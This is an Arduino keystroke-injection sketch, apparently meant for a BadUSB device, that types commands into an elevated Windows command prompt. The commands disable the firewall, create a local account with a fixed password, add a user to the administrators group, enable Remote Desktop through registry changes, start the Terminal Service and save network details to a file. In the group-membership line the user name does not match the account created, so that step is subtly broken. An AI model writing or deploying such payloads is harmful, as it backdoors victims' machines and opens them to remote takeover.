#include <Keyboard.h>


// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  delay(20000);
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  delay(2000);

  typeKey(KEY_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  delay(400);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(4000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("netsh firewall set opmode mode=disable");

  typeKey(KEY_RETURN);

  delay(400);

  //Keyboard.print("ALT y");

  //typeKey(KEY_RETURN);

  //delay(400);

  Keyboard.print("net user /add testName pass123");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("net localgroup administrators username /add");

  typeKey(KEY_RETURN);

  delay(400);
  

  Keyboard.print("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("sc config TermService start= auto");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("net start Termservice");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("cd %USERPROFILE%");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("ipconfig /all > number.txt");

  typeKey(KEY_RETURN);

  delay(400);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
